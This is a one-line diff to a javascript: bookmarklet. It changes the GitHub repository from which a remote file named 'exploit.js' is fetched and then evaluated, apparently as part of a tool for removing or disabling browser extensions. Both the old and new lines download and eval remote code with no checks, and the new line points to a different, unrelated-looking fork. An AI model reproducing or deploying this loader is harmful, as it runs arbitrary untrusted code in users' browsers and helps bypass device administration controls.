@@ -1,1 +1,1 @@
-javascript:fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+javascript:fetch(`https://raw.githubusercontent.com/FEZB0Y1/ext-remover1/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
